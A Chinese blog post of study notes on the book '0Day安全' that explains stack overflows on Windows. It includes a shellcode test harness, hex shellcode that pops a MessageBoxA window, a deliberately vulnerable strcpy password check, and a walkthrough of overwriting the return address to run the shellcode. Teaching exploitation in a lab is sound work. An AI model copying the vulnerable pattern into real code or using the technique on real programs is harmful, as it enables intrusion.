---
title: 《0 Day分析》 之栈溢出
date: 2017-03-15 09:33:32
tags:
- 0Day
- 原理
categories:
- 调试
---

本文作为学习《0Day安全：软件漏洞分析技术》的笔记，将书中自己觉得比较关键的地方做过抄录和总结，权作为以后的一些参考吧。本篇中主要简单总结一下0Day漏洞的基础。后面会有Windows安全机制总结，以及自己对照书本对一部分实例的分析过程。

### 工具 ###

0Day安全中，提到了一些基本的工具，这些工具作为研究漏洞的几个必要条件，需要掌握一下。当然，也不是必须用作者提到的那些工具，对于自己熟悉的其他的类似工具，完全可以用它们替代（能看到这本书的朋友，估计下面这些工具都不是问题，此处不再赘述）。

* OllyDbg
* WinDbg
* IDA Pro
* UltroEdit
* VMWare
* Python

### ShellCode ###

漏洞利用目的简单说就是获取权限，执行代码。当然执行代码做什么事就是由代码决定了。要执行代码，就要得到执行时机，这个执行时机的获取，通常就是通过跳转到ShellCode代码实现，进一步执行想要的任务，例如连接服务器下载程序，执行本地程序，添加开机启动等等。如何跳转到ShellCode是栈溢出、堆溢出等一些漏洞利用要做的关键事情。

由于漏洞研究一般是安全人员在特定环境验证代码，不需要特别的ShellCode。所以个人觉得研究漏洞没有必要过多研究ShellCode的内容，只是到简单的ShellCode无法使用，或者验证绕过安全软件或系统的安全机制，需要特殊ShellCode时研究即可（当然这仅仅是个人认识，毕竟ShellCode编写也是一门学问，包括ShellCode压缩，编码等很多知识，研究过多有点偏了重点的意味）。

当然了，不建议深入研究，并不代表一点也不需要了解。还是要了解一些基本知识。

ShellCode的获取和调试，可以将ShellCode贴到自己的程序中，先调试一下，确保代码执行正常。比较简单的方式是写一个程序做验证。将shellcode代码放到数组中，或直接将汇编添加到程序中尝试执行。比如：
<!-- more -->
```C
#include "stdafx.h"
#include <Windows.h>

// 需要填写对应系统中  两个函数的地址
int _tmain(int argc, _TCHAR* argv[])
{
	HINSTANCE hLibHandle;
	char dllbuf[11] = "user32.dll";
	hLibHandle = LoadLibraryA(dllbuf);

	__asm
	{
		sub esp, 0x440
		xor ebx, ebx
		push ebx  // cut string
		push 0x74736577
		push 0x6c696166
		mov eax, esp  // load address of failwest
		push ebx
		push eax
		push eax 
		push ebx 
		mov eax, 0x77D804EA
		call eax		// MessageBoxA

		push ebx
		mov eax, 0x7c81cdda
		call eax  // call exit
	}

	return 0;
}
```

```C
#include "stdafx.h"
#include <Windows.h>

char ShellCode[] = "\x81\xEC\x40\x04\x00\x00\x33\xDB\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50\x53\xB8\xEA\x04\xD8\x77\xFF\xD0\x53\xB8\xDA\xCD\x81\x7C\xFF\xD0";

// 需要填写对应系统中  两个函数的地址
int _tmain(int argc, _TCHAR* argv[])
{
	HINSTANCE hLibHandle;
	char dllbuf[11] = "user32.dll";
	hLibHandle = LoadLibraryA(dllbuf);
	LPVOID lpAddr = (LPVOID)ShellCode;

	__asm
	{
		jmp lpAddr
	}

	return 0;
}
```

<div align="center">
![ShellCode执行结果](/img/2017-03-15-ZeroDay-Principle-stackoverflow-MessageBoxA.jpg)
</div>

上述两个例子比较简单，执行结果如上图所示，就是调用User32.dll的MessageBoxA方法（函数地址被硬编码"0x77D804EA"，自己测试需要根据本机的MessageBoxA地址，修改一下），然后再调用Kernel32!ExitProcess方法退出进程。

对于第二个例子，将ShellCode写成最终的16进制表示的形式。在Win7及其之后系统上需要注意，这个代码在VS中编译完成之后，无法直接运行，会出现ShellCode[]数组无法执行的错误。

上述只是对shellcode的调试做了一个简单的例子，具体到shellcode的内容还很多，比如ShellCode中调用函数自定位（不需要硬编码函数地址，通用性更好），编码，压缩等等。编码可以防止ShellCode被杀软扫到；压缩ShellCode可以使得ShellCode更加精简短小，利于ShellCode的传输，以及在内存中存放位置可以更加灵活。想要了解更多的ShellCode内容的话，可以参考《0Day安全》或者是《ShellCoder编程解密》等书籍。

### 栈溢出 ###

##### 1. 函数调用 #####

栈溢出是漏洞研究中最基本的知识，同时它也是最古老，最经典的问题。这一节简单总结一下栈溢出的利用机制。（注意，此处的"栈溢出"中的栈指的是系统栈，用于保存局部变量，函数调用传参，函数调用返回地址等；而非数据结构中所讲述的栈数据结构。当然了使用数据结构中的栈数据结构时处理不当，是可能产生栈溢出的）

栈溢出中首先要说的是函数调用过程。用如下的几个函数之间的调用来说明一下函数调用的过程，代码如下：

```C++
int func_B(int arg_B1, int arg_B2)
{
	int var_B1, var_B2;
    var_B1 = arg_B1 + arg_B2;
    var_B2 = arg_B1 - arg_B2;
    return var_B1 * var_B2;
}

int func_A(int arg_A1, int arg_A2)
{
	int var_A;
    var_A = func_B(arg_A1, arg_A2) + arg_A1;
    return var_A;
}

int main(int argc, char **argv)
{
	int var_main;
    var_main = func_A(4, 3);
    return var_main;
}
```

<div align="center">
![图1 函数调用](/img/2017-03-15-ZeroDay-Principle-stackoverflow-funccall.jpg)
</div>

如上图所示，一个函数调用时，会在栈上形成一个函数调用栈帧。一个函数调用栈帧的内容依次为返回地址，局部变量等值。大致过程如下，图示的过程如下图：
* 参数入栈：参数从右向左一次压入系统栈（不同的调用约定，顺序不同）
* 返回地址入栈： 将当前代码区调用指令的下一条指令压入栈中，即EIP的内容
* 代码区跳转： 从当前代码区跳转到被调用函数入口处
* 栈帧调整：其中包括保存当前的栈帧状态值，将栈帧切换到新的栈帧，给新的函数栈帧分配空间（局部变量等）

<div align="center">
![图2 函数调用栈](/img/2017-03-15-ZeroDay-Principle-stackoverflow-onecall.jpg)
</div>

当函数返回时，整个过程与函数调用时相反，如下所述：
* add esp    降低栈顶，将函数调用中分配的函数栈帧回收
* pop ebp    切换栈帧到之前的函数中
* retn       两个功能：a.弹出栈顶元素，即返回地址 b.处理器跳转到弹出的返回地址处

##### 2. 栈溢出小例子 #####

先说一个栈溢出的例子，以及其中的一些问题。如下先给出例子的代码：

```C
#include "stdafx.h"
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <Windows.h>

#define PASSWORD "1234567"

#pragma optimize("", off)
int verify_password(char *password)
{
	int authenticated;
	char buffer[8];
	authenticated = strcmp(password, PASSWORD);
	strcpy(buffer, password);
	return authenticated;
}
#pragma optimize("", on)

int _tmain(int argc, _TCHAR* argv[])
{
	int valid_flag = 0;
	char password[1024];

	while(1)
	{
		printf("please input password:    ");
		scanf("%s", password);
		valid_flag = verify_password(password);
		if (valid_flag)
		{
			printf("incorrect password!\n\n");
		}
		else
		{
			printf("Congratulation! You have passed the verification!\n\n");
			break;
		}
	}

	system("pause");
	return 0;
}
```

例子也比较容易理解，就是输入一个字符串，验证是否是密码。程序的密码被定义为"1234567"，将输入的字符串与上述密码做字符串比较。根据返回结果，输出是否验证通过。此处为了演示栈溢出，在strcmp()后专门添加了字符串拷贝的方法strcpy()这个函数做字符串拷贝，并未考虑到缓存大小，一直到拷贝到源字符串中出现结束符为止；如果源字符串的大小大于目的变量的缓存区大小，则会将缓存区"撑爆"，就出现了溢出。一旦出现了溢出，大于目的变量缓存大小的部分就有可能覆盖其他的变量，这要依据栈上或堆上的内容分布情况。本例的目的是，通过栈溢出实现让密码验证通过（当然这个密码验证通过的密码是有条件的，见稍后的分析）。

0Day安全中的例子是在XP下的VC6.0上编译通过，并可以完成执行。但是目前系统普遍为Win7，且编译器也多数在VS2005及其之后的更高版本上。这些新的版本中，编译时会自动加入一些安全机制，比如GS等，为了能够让上述代码在VS2008上编译出来可以正常运行，需要做如下的设置：
* 使用Release版本的exe进行验证
&emsp;&emsp;Debug版本的exe对栈有保护机制，每个变量会进行内存对齐，两个变量间填充有0xCC的保护区，此处的溢出太短，触发不到问题。
&emsp;&emsp;再一个问题是调试版本的代码中包含栈校验机制，在函数返回前会校验栈的完整性，因此一旦溢出会触发异常。这也会导致触发不到问题。
* VS2008机器之后的版本中，Release版本的优化比较完善，需要对代码做不优化设置。
&emsp;&emsp;对于例子中的verify_password()函数，需要关闭优化，否则该函数会被编译器内联到main()函数中，这样整个函数就可能出现溢出不掉密码验证结果的效果了。如代码所示，将该函数的优化强制关闭，让它编译成独立的函数。

按照上述的设置之后，编译完程序，输入如下图的内容，可以得到密码验证通过的输出。

<div align="center">
![图3 破解密钥结果](/img/2017-03-15-ZeroDay-Principle-stackoverflow-crack_key.jpg)
</div>

按照上述代码，可以看出函数verify_password()中的变量布局如下图所示。箭头方向为地址增大方向（注意系统栈是从高地址向低地址增长），根据函数中变量的声明顺序，先是authenticated，再是buffer，由此就有如图的布局。如上文所述，此处要想出现上图的口令验证通过消息，需要让函数返回0，即authenticated变量值为0。authenticated变量值为0，有两个方法：1.知道密码，直接输入，返回就是0。2.通过特殊手段，例如栈溢出，将authenticated变量覆盖为0。strcpy()方法是在遇到字符串结束符时，才停止复制；而strcpy()函数的返回值为-1，0，1三个值；考虑一下返回0，那就是知道密码了，返回-1说明输入字符串小于密码，返回1表示输入字符串大于密码字符出啊。

<div align="center">
![图4 局部变量](/img/2017-03-15-ZeroDay-Principle-stackoverflow-localvalues.jpg)
![图5 大于密钥的字符串](/img/2017-03-15-ZeroDay-Principle-stackoverflow-bigstr.jpg)
![图6 小于密钥的字符串](/img/2017-03-15-ZeroDay-Principle-stackoverflow-LittleStr.jpg)
</div>

上面两个图，就很明显地表示了，输入大于密码字符串和小于密码字符串的不同之处。当输入大于密码的字符串时，只需要比密码长度多输入一个字节，字符串结尾的结束符0，就将后面authenticated变量的低字节处的1覆盖为0。达到验证密码通过的要求。

##### 3. 栈溢出利用 #####

有了上述的栈溢出例子的铺垫，下面我们想要利用栈溢出就顺理成章了。如第二部分ShellCode所述的，利用说简单点，就是要从有问题的地方，跳转到我们的ShellCode，执行我们的代码。根据前面的内存布局图，可以知道在变量authenticated后面是前栈帧的EBP，再往后面是返回地址。有前面的例子，如果我们将输入字符串增大，strcpy()时就会进一步向后覆盖，直到覆盖到返回地址，返回地址原值是main()函数调用verify_password()函数地方的下一条指令的地址，如果我们能将它覆盖成ShellCode的地址，那么函数一旦返回就会跳去执行ShellCode代码了。先上代码，根据代码以及执行结果加以解释。

```C
#include "stdafx.h"
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <Windows.h>
#include <Shlwapi.h>
#pragma comment(lib, "Shlwapi.lib")

#define PASSWORD "1234567"

#pragma optimize("", off)
int verify_password(char *password)
{
	int authenticated;
	char buffer[44];

	authenticated = strcmp(password, PASSWORD);
	strcpy(buffer, password);
	return authenticated;
}
#pragma optimize("", on)


int _tmain(int argc, _TCHAR* argv[])
{
	int valid_flag = 0;
	char password[1024];

	FILE * fp;

	LoadLibraryA("user32.dll");

	char szPath[MAX_PATH] = {};
	GetModuleFileNameA(NULL, szPath, MAX_PATH);
	PathCombineA(szPath, szPath, "..\\password.txt");
	if (!(fp = fopen(szPath, "r")))
	{
		exit(0);
	}

	fscanf(fp, "%s", password);

	valid_flag = verify_password(password);
	if (valid_flag)
	{
		printf("incorrect password!\n\n");
	}
	else
	{
		printf("Congratulation! You have passed the verification!\n\n");
	}

	fclose(fp);

	system("pause");
	return 0;
}
```

为了能够延时溢出利用的例子，首先将buffer值改成44字节，这样就可以容纳我们的ShellCode；再一点是ShellCode中有不可显示的字节，那么直接从控制台输入不了，简单点，将从控制台读取数据，改为从文件读取。就写成了如上的代码。

```ShellCode
008b4028 33db            xor     ebx,ebx
008b402a 53              push    ebx
008b402b 6877657374      push    74736577h
008b4030 686661696c      push    6C696166h
008b4035 8bc4            mov     eax,esp
008b4037 53              push    ebx
008b4038 50              push    eax
008b4039 50              push    eax
008b403a 53              push    ebx
008b403b b8aefd7876      mov     eax,offset USER32!MessageBoxA (7678fdae)
008b4040 ffd0            call    eax
008b4042 90              nop
008b4043 90              nop
008b4044 90              nop
008b4045 90              nop
```

下面来说一下ShellCode的内容，如上块代码块所示。比较简单，只是调用了一下MessageBoxA函数，弹出一个窗口即可。调整ShellCode之后，直接运行程序，得到如下结果：

<div align="center">
![图7 弹窗示例](/img/2017-03-15-ZeroDay-Principle-stackoverflow-popwnd.jpg)
</div>

解释一下上述结果生效原因。有前面一个例子的铺垫，以及前面对于原理的简述。一句话，将函数返回地址覆盖成了栈上ShellCode的地址，这样在函数返回时，执行ShellCode，就弹出了上图的窗口。当然，因为ShellCode没有做进一步处理，弹完窗口之后，程序就崩溃了（原因是call 之后的nop执行完，再往后面栈上的代码不确定）。

依然看图说话，和前面的原因相同，在执行strcpy()时，由于"输入"的内容比较多，覆盖了本来的返回地址，（在本例中是0x0017f288地址处的值）；它变成了0x0017f254，这个地址就是buffer变量的起始地址。那么当verify_password()返回时，就直接跳到了buffer变量的起始地址区执行了。再往下给出了变量地址处的汇编代码。可知它就是我们前面的ShellCode代码。

<div align="center">
![图8 Windbg调试内容](/img/2017-03-15-ZeroDay-Principle-stackoverflow-memcontent.jpg)
</div>

上面利用的例子，它利用的是strcpy()函数在复制字符串时不判断长度，而根据结束符'\0'来结束复制的弱点。那么同理，如果我们的ShellCode中如果有了'\0'，那么strcpy()在复制时就会漏掉'\0'之后的内容。所以某些情况下，ShellCode也需要做处理，比如前面说的ShellCode编码等，来满足这种特殊场景。

上述例子只是说明性的示例，如果实际应用还是有很多问题的，例子中首先要求缓存能够放下我们的ShellCode，否则溢出就没办法准确溢出掉返回地址了;同时覆盖的返回地址是硬编码进去的，当前的Win7等系统上都有地址随机化的功能，那么可能只有很少的机器能碰上ShellCode中硬编码的的地址。

进化一点的方法是使用"跳板"，比如在函数return时，esp寄存器的值是不变的，所以可以将返回地址溢出为jmp esp指令的地址，然后将ShellCode部署到esp寄存器中指向的地址（其实就是返回地址后面的栈空间，具体要调试函数确定），这样可以有比较好的通用性。它也会遇到其他问题，现代机器上模块加载地址也实现了随机化，就是每次启动系统，各个模块的加载地址也不固定。

当然进一步，还有堆喷等机制，这个后面再说吧，堆的机制还没有学明白呢，写这个太欠缺了。

> *堆溢出*
> &emsp;&emsp;下回分解
> *其他内存攻击技术*
> &emsp;&emsp;下回分解

By Andy @ 2017/03/24 21:30:17 